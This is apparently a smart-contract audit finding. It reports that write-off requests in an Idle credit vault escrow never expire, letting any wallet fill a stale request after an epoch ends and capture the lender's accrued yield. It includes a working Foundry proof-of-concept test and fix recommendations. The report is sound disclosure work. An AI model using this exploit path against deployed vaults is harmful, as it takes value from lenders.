### Title
Stale write-off requests remain executable after their epoch expires - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` is valid only while an epoch is running, but the resulting authorization never expires and `fullfillWriteOffRequest` does not verify that the epoch is still running. A lender’s escrowed tranche tokens can therefore be purchased later at stale terms after tranche NAV has changed.

### Finding Description
`createWriteOffRequest` rejects new requests unless `IdleCDOEpochVariant.isEpochRunning()` is true, escrow the seller’s tranche tokens, and records a fixed `underlyingsRequested` amount. [1](#0-0) 

`fullfillWriteOffRequest` can subsequently be called by any wallet and has no epoch-state check, request timestamp, deadline, nonce, or epoch binding. It only verifies the full tranche amount and that the fulfiller pays at least the stale request amount. [2](#0-1) 

Consequently, a request created in epoch `N` remains executable after `stopEpoch` has transitioned the vault into the buffer phase, after a later epoch has started, or after tranche prices have changed. The seller’s only mitigation is `deleteWriteOffRequest`, but an attacker can monitor a dormant request and front-run the deletion with fulfillment. [3](#0-2) [2](#0-1) 

The acquired tranche tokens are not inert receipts: after fulfillment, a wallet-allowed attacker can call `requestWithdraw`, which values the purchased tranche tokens at the current tranche price plus applicable withdrawal interest and fees. [4](#0-3) 

### Impact Explanation
An attacker can expropriate yield accrued by the seller’s escrowed tranche tokens.

For example, a lender escrows `10_000e18` AA tranche tokens requesting `10_000e6` USDC while the epoch is running. After borrower repayment increases the tranche value, the attacker fulfills the stale request for `10_000e6` USDC and obtains tranche tokens whose current withdrawable value is greater than the stale price. The attacker captures approximately:

```solidity
stolenYield = currentWithdrawableValue - underlyingsPaid
```

The seller loses that appreciation and receives only `underlyingsRequested - exitFee`, even though the sale was authorized under an earlier epoch’s market and credit state. [5](#0-4) 

This is a direct value transfer from the lender to the attacker rather than a normal borrower write-off: any wallet may fulfill the request, and the fulfiller is not required to be the borrower. [6](#0-5) 

### Likelihood Explanation
Likelihood is moderate. The attack requires a lender to leave a write-off request unclaimed or undeleted across an epoch transition, which is plausible because no expiry is communicated or enforced. Once present, exploitation is public and only requires the underlying payment and approval. [2](#0-1) 

Interest accrual, NAV repricing, loss crystallization, borrower rotation, or a change in credit status can all make the fixed request stale. The attacker can also wait until the delta is profitable and front-run a later deletion transaction.

### Recommendation
Bind each write-off request to a bounded authorization:

- Store `epochNumber`, `block.timestamp`, or an explicit `expiresAt` in `WriteOffRequest`.
- Reject fulfillment when the stored epoch no longer matches `IdleCreditVault.epochNumber()`, or when `!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()`.
- Prefer an explicit user-selected `expiresAt`, bounded to the current epoch.
- Alternatively, replace the aggregate storage request with a signed order containing tranche amount, underlying amount, nonce, and deadline.
- If requests are intended only for the borrower, enforce `msg.sender == IdleCreditVault(strategy).borrower()` rather than using the stale cached `borrower` field.

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`. It uses the existing mainnet-fork setup and `_stopCurrentEpoch()` helper.

```solidity
function testStaleWriteOffRequestCanBeFulfilledAfterEpochEnd() external {
    address attacker = makeAddr("staleRequestBuyer");
    uint256 requestedTranches = 10_000e18;
    uint256 requestedUnderlyings = 10_000e6;

    // LP authorizes the fixed-price sale while the epoch is running.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, requestedUnderlyings);

    uint256 staleEpochEnd = cdoEpoch.epochEndDate();

    // End the epoch normally. The request was authorized in a different phase,
    // but no state in the escrow prevents its later execution.
    _stopCurrentEpoch();
    assertFalse(cdoEpoch.isEpochRunning());
    assertEq(cdoEpoch.epochEndDate(), staleEpochEnd);

    // The attacker executes the stale request after epoch end.
    deal(address(underlying), attacker, requestedUnderlyings);
    vm.startPrank(attacker);
    underlying.approve(address(escrow), requestedUnderlyings);
    escrow.fullfillWriteOffRequest(
        LP,
        requestedTranches,
        requestedUnderlyings
    );
    vm.stopPrank();

    assertEq(
        tranche.balanceOf(attacker),
        requestedTranches,
        "stale request did not transfer tranches"
    );

    // The attacker can convert the tranche position into a withdrawal request.
    // `quoted` is valued using post-stop/current accounting, not the stale ask.
    vm.prank(attacker);
    uint256 quoted = cdoEpoch.requestWithdraw(0, address(tranche));

    assertGt(
        quoted,
        requestedUnderlyings,
        "attacker did not capture accrued tranche value"
    );

    // Start and settle the next epoch so the receipt is funded.
    vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
    vm.prank(manager);
    cdoEpoch.startEpoch();

    uint256 toRepay =
        cdoEpoch.expectedEpochInterest() + strategy.pendingWithdraws();
    deal(address(underlying), borrower, toRepay);
    vm.startPrank(borrower);
    underlying.approve(address(cdoEpoch), toRepay);
    vm.stopPrank();

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, cdoEpoch.expectedEpochInterest());

    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    assertGt(
        underlying.balanceOf(attacker) - attackerUnderlyingBefore,
        requestedUnderlyings,
        "attacker failed to monetize stale request"
    );
}
```

The decisive assertion is that `fullfillWriteOffRequest` succeeds after `_stopCurrentEpoch()` makes the request stale. The subsequent withdrawal flow demonstrates that the attacker acquired currently claimable vault value rather than merely receiving a useless token receipt.

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L105-115)
```text
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```
